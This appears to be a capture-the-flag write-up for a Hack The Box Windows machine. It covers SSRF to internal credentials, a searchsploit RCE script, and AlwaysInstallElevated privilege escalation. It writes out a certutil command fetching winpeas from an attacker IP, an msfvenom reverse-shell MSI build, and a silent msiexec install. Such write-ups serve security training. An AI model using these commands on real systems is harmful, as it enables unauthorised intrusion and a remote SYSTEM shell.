![[Pasted image 20250426025006.png]]
Checking the certificate [[ssl]] in [[port 443]] with [[openssl]] we found a domain `staging.love.htb` and on the browser we see this in demo section:

![[Pasted image 20250426140229.png]]

as we know the port 5000 is open too, we can check internally with that remote file scan events a [[Server Side Request Forgery (SSRF)]]

![[Pasted image 20250426140524.png]]

and we got the `admin` credentials, now if we use [[searchsploit]] to find how get a remote command execution, we find 

![[Pasted image 20250426144449.png]]

as we have credentials we can use this [[Python]] script.

![[Pasted image 20250426144531.png]]

Changing the respective data and url's

![[Pasted image 20250426144602.png]]

we got access.

for the privilege escalation we use [[winpeas.exe]]. 

we can user [[certutil.exe]] to get the executable of winpeas to victim machine.

```powershell
certutil.exe -f -urlcache -split http://10.10.16.2/tools/winpeas.exe
```

and we found [[AlwaysInstallElevated]] is set to 1
the we going to exploit this.

we going to use [[msfvenom]] to create a malicious file

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=9003 --platform windows -a x64 -f msi -o r.msi
```

upload the result to the target machine, and install:

```bash
msiexec /quiet /qn /i r.msi
```

and we get access as Authority user.

![[Pasted image 20250426155518.png]]